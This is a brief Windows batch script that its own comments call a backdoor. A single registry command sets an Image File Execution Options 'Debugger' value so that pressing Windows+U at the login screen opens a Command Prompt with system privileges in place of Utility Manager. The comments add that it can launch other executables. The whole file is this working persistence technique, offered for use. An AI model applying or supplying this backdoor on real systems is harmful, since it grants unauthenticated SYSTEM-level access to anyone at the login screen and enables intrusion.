REM This script will bind Utility Manager (Windows + U) (utilman.exe) to spawn a Command Prompt shell
REM It can be modified to spawn other .exe files if you provide it with the absolute path.
REM The script is used to fire at login screen with system priveleges

REM Run the backdoor with admin privileges!

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f